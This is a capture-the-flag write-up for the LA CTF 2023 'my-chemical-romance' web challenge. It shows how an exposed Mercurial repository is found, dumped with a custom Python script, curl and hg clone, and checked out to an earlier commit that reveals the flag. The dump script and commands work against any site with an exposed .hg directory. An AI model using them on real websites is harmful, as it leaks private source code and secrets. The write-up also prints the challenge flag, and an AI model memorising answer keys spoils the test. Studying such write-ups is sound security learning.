# my-chemical-romance

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★☆

- 104 solves / 439 points

## Background

> Author: bliutech

When I was... a young boy... I made a "My Chemical Romance" fanpage!

[my-chemical-romance.lac.tf](https://my-chemical-romance.lac.tf)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211143232.png)

A "My Chemical Romance" fanpage, cool.

In here, we see 5 "My Chemical Romance"'s YouTube music video.

Hmm... It seems empty.

**What if I go to a non-existence page?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211143654.png)

A custom 404 page?

However, our supplied path did NOT reflected to the page. So, no XSS, CSTI/SSTI or other client-side vulnerability in here.

**After fumbling around, I found that the web application accept HEAD method:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.11|14:47:01(HKT)]
└> curl -I https://my-chemical-romance.lac.tf/  
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Sat, 11 Feb 2023 06:48:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1976
Connection: keep-alive
Content-Disposition: inline; filename=index.html
Last-Modified: Fri, 10 Feb 2023 23:25:52 GMT
Cache-Control: no-cache
ETag: "1676071552.0-1976-1075513058"
Source-Control-Management-Type: Mercurial-SCM
```

Wait. "Source-Control-Management-Type: Mercurial-SCM"??

I never heard this before.

**Let's google that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211144923.png)

Hmm... So, Mercurial SCM is like Git??

**[Offical website](https://www.mercurial-scm.org/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211145047.png)

**That being said, the website has version control??**

Can we clone that repository?

```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|16:27:08(HKT)]
└> hg clone https://my-chemical-romance.lac.tf/
abort: empty destination path is not valid
```

Nope...

After fumbling around, I was able to find [this](https://github.com/arthaud/hg-dumper) GitHub repository, which is a tool to dump a mercurial repository from a website.

However, I couldn't install it due to Python2. Maybe pip and virtualenv hates me :(

**So, I'll write a Python script to download all of them:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
import os

def download(URL, file):
    requestResult = requests.get(URL + file)

    if 'Error 404: Page Not Found' not in requestResult.text:
        print(f'[+] Found valid file: {file}')
        
        with open(file, 'wb') as fd:
            fd.write(requestResult.text.encode('utf-8'))

def main():
    listFiles = [
        '.hg/00changelog.i',
        '.hg/branch',
        '.hg/cache/branch2-served',
        '.hg/cache/branchheads-served',
        '.hg/cache/checkisexec',
        '.hg/cache/checklink',
        '.hg/cache/checklink-target',
        '.hg/cache/checknoexec',
        '.hg/dirstate',
        '.hg/hgrc',
        '.hg/last-message.txt',
        '.hg/requires',
        '.hg/store',
        '.hg/store/00changelog.i',
        '.hg/store/00manifest.i',
        '.hg/store/fncache',
        '.hg/store/phaseroots',
        '.hg/store/undo',
        '.hg/store/undo.phaseroots',
        '.hg/store/requires',
        '.hg/undo.bookmarks',
        '.hg/undo.branch',
        '.hg/undo.desc',
        '.hg/undo.dirstate',
        '.hgignore'
    ]

    URL = 'https://my-chemical-romance.lac.tf/'

    if not os.path.exists('.hg'):
        os.makedirs('.hg')
        os.makedirs('.hg/cache')
        os.makedirs('.hg/store')
        os.makedirs('.hg/wcache')

    for file in listFiles:
        thread = Thread(target=download, args=(URL, file))
        thread.start()
        sleep(0.1)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|17:50:28(HKT)]
└> python3 dumper.py
[+] Found valid file: .hg/00changelog.i
[+] Found valid file: .hg/cache/branch2-served
[+] Found valid file: .hg/dirstate
[+] Found valid file: .hg/last-message.txt
[+] Found valid file: .hg/requires
[+] Found valid file: .hg/store/00changelog.i
[+] Found valid file: .hg/store/00manifest.i
[+] Found valid file: .hg/store/fncache
[+] Found valid file: .hg/store/phaseroots
[+] Found valid file: .hg/store/undo
[+] Found valid file: .hg/store/undo.phaseroots
[+] Found valid file: .hg/store/requires
[+] Found valid file: .hg/undo.bookmarks
[+] Found valid file: .hg/undo.branch
[+] Found valid file: .hg/undo.desc
[+] Found valid file: .hg/undo.dirstate
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|17:50:54(HKT)]
└> ls -lah .hg/
total 48K
drwxr-xr-x 5 siunam nam 4.0K Feb 12 17:46 .
drwxr-xr-x 3 siunam nam 4.0K Feb 12 17:45 ..
-rw-r--r-- 1 siunam nam   59 Feb 12 17:50 00changelog.i
drwxr-xr-x 2 siunam nam 4.0K Feb 12 17:45 cache
-rw-r--r-- 1 siunam nam  302 Feb 12 17:50 dirstate
-rw-r--r-- 1 siunam nam   44 Feb 12 17:50 last-message.txt
-rw-r--r-- 1 siunam nam   11 Feb 12 17:50 requires
drwxr-xr-x 2 siunam nam 4.0K Feb 12 17:47 store
-rw-r--r-- 1 siunam nam    0 Feb 12 17:50 undo.bookmarks
-rw-r--r-- 1 siunam nam    7 Feb 12 17:50 undo.branch
-rw-r--r-- 1 siunam nam    9 Feb 12 17:50 undo.desc
-rw-r--r-- 1 siunam nam  305 Feb 12 17:50 undo.dirstate
drwxr-xr-x 2 siunam nam 4.0K Feb 12 17:45 wcache
```

Nice!

**In `.hg/last-message.txt`, we see this:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|17:50:58(HKT)]
└> cat .hg/last-message.txt 
Decided to keep my favorite song a secret :D 
```

**Hmm... Let's view all the commit logs:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|17:51:17(HKT)]
└> hg log        
abort: index 00changelog is corrupted
```

`00changelog` is corrupted?

**In `.hg/00changelog.i`, we see this:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|17:52:20(HKT)]
└> cat .hg/00changelog.i   
ÿÿ dummy changelog to prevent using the old repo layout
```

**Also, in `.hg/store/fncache`, we see this:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|18:05:23(HKT)]
└> cat .hg/store/fncache 
data/static/404.html.i
data/static/mcr-meme.jpeg.i
data/static/index.css.i
data/gerard_way2001.py.i
data/static/my-chemical-romance.jpeg.i
data/static/index.html.i
data/static/my-chemical-romance.jpeg.d
```

It looks like it's the file structure of the web application?

The `gerard_way2001.py` looks interesting, but I couldn't fetch it.

Anyway, let's go back to the error.

It seems like I got a different file in my Python script.

**Let's use `curl` or `wget` to download the real one:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg/store)-[2023.02.12|18:16:20(HKT)]
└> curl https://my-chemical-romance.lac.tf/.hg/store/00changelog.i -o 00changelog.i
```

**Then, run `hg log` again:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg/store)-[2023.02.12|18:17:20(HKT)]
└> hg log
warning: ignoring unknown working parent 3ec38b3a79c3!
changeset:   1:3ecb3a79e255
tag:         tip
user:        bliutech <bensonhliu@gmail.com>
date:        Fri Feb 10 06:50:48 2023 -0800
summary:     Decided to keep my favorite song a secret :D

changeset:   0:2445227b04cd
user:        bliutech <bensonhliu@gmail.com>
date:        Fri Feb 10 06:49:48 2023 -0800
summary:     I love 'My Chemical Romance'

(END)
```

Nice!! We now can read all the commits!

The first commit looks sussy!

**Let's switch to that commit!**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg)-[2023.02.12|18:27:30(HKT)]
└> hg checkout 2445227b04cd            
abort: data/gerard_way2001.py@c87e2916933c23490cdbb457c4113c31df357d87: no match found
```

> Note: If you see another error, you could re-download all the files.

No match found??

**After poking around at the [Mercurial documentation](https://www.mercurial-scm.org/wiki/Repository), I found this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230212205816.png)

The revlog per tracked files are in `.hg/store/data/<encoded path>.i`!

**Then, look at the `.hg/store/fncache`:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg/store)-[2023.02.12|20:59:03(HKT)]
└> cat fncache    
data/static/404.html.i
data/static/mcr-meme.jpeg.i
data/static/index.css.i
data/gerard_way2001.py.i
data/static/my-chemical-romance.jpeg.i
data/static/index.html.i
data/static/my-chemical-romance.jpeg.d
```

That makes sense now!

**Let's download all of them:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg/store/data/static)-[2023.02.12|20:59:50(HKT)]
└> ls -lah     
total 240K
drwxr-xr-x 2 siunam nam 4.0K Feb 12 20:57 .
drwxr-xr-x 3 siunam nam 4.0K Feb 12 20:55 ..
-rw-r--r-- 1 siunam nam  280 Feb 12 20:55 404.html.i
-rw-r--r-- 1 siunam nam  359 Feb 12 20:55 index.css.i
-rw-r--r-- 1 siunam nam  745 Feb 12 20:57 index.html.i
-rw-r--r-- 1 siunam nam  64K Feb 12 20:55 mcr-meme.jpeg.i
-rw-r--r-- 1 siunam nam 149K Feb 12 20:56 my-chemical-romance.jpeg.d
-rw-r--r-- 1 siunam nam   64 Feb 12 20:55 my-chemical-romance.jpeg.i
```

**However:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/.hg/store/data)-[2023.02.12|21:00:08(HKT)]
└> curl https://my-chemical-romance.lac.tf/.hg/store/data/gerard_way2001.py.i
<!DOCTYPE html>
<html>
    <head>
        <title>My Favorite Band: My Chemical Romance</title>
        <link rel="stylesheet" href="/index.css">
    </head>
    <body>
        <div class="content">
            <h1>Error 404: Page Not Found</h1>
            <img src="/mcr-meme.jpeg">
        </div>
    </body>
</html>
```

The `.hg/store/data/gerard_way2001.py.i` doesn't exist on the web server!

I think this could happened is because the web server is hosting the latest version of the repository.

However, I still wasn't able to retrieve the `gerard_way2001.py`...

## After the CTF

***After the CTF has finished, I review my `hg clone` error output:***
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance)-[2023.02.12|16:27:08(HKT)]
└> hg clone https://my-chemical-romance.lac.tf/
abort: empty destination path is not valid
```

Wait... "empty destination path"??? Did I just miss that for the entire CTF?!!

**Umm...**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after)-[2023.02.13|16:40:26(HKT)]
└> hg clone https://my-chemical-romance.lac.tf/ mcr 
requesting all changes
malformed line in .hg/bookmarks: '<!DOCTYPE html>'
malformed line in .hg/bookmarks: '<html>'
malformed line in .hg/bookmarks: '<head>'
malformed line in .hg/bookmarks: '<title>My Favorite Band: My Chemical Romance</title>'
malformed line in .hg/bookmarks: '<link rel="stylesheet" href="/index.css">'
malformed line in .hg/bookmarks: '</head>'
malformed line in .hg/bookmarks: '<body>'
malformed line in .hg/bookmarks: '<div class="content">'
malformed line in .hg/bookmarks: '<h1>Error 404: Page Not Found</h1>'
malformed line in .hg/bookmarks: '<img src="/mcr-meme.jpeg">'
malformed line in .hg/bookmarks: '</div>'
malformed line in .hg/bookmarks: '</body>'
malformed line in .hg/bookmarks: '</html>'
adding changesets
adding manifests
adding file changes
added 2 changesets with 8 changes to 6 files
new changesets 2445227b04cd:3ecb3a79e255
updating to branch default
6 files updated, 0 files merged, 0 files removed, 0 files unresolved
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after)-[2023.02.13|16:46:56(HKT)]
└> ls -lah mcr 
total 20K
drwxr-xr-x 4 siunam nam 4.0K Feb 13 16:40 .
drwxr-xr-x 3 siunam nam 4.0K Feb 13 16:40 ..
-rw-r--r-- 1 siunam nam  420 Feb 13 16:40 gerard_way2001.py
drwxr-xr-x 5 siunam nam 4.0K Feb 13 16:40 .hg
drwxr-xr-x 2 siunam nam 4.0K Feb 13 16:40 static
```

Gosh darn it!

**Anyway, we should able to get the flag by using `checkout`:**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after)-[2023.02.13|16:47:31(HKT)]
└> cd mcr                    
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after/mcr)-[2023.02.13|16:47:36(HKT)]
└> hg checkout 2445227b04cd                        
2 files updated, 0 files merged, 0 files removed, 0 files unresolved
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after/mcr)-[2023.02.13|16:47:41(HKT)]
└> ls -lah    
total 20K
drwxr-xr-x 4 siunam nam 4.0K Feb 13 16:47 .
drwxr-xr-x 3 siunam nam 4.0K Feb 13 16:40 ..
-rw-r--r-- 1 siunam nam  469 Feb 13 16:47 gerard_way2001.py
drwxr-xr-x 5 siunam nam 4.0K Feb 13 16:47 .hg
drwxr-xr-x 2 siunam nam 4.0K Feb 13 16:47 static
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/my-chemical-romance/after/mcr)-[2023.02.13|16:47:43(HKT)]
└> cat gerard_way2001.py    
from flask import Flask, send_from_directory, Response

app = Flask(__name__)

# FLAG: lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}
[...]
```

We found the flag!

- Flag: `lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}`

# Conclusion

What we've learned:

1. Leaking Mercurial SCM Repository In An Web Application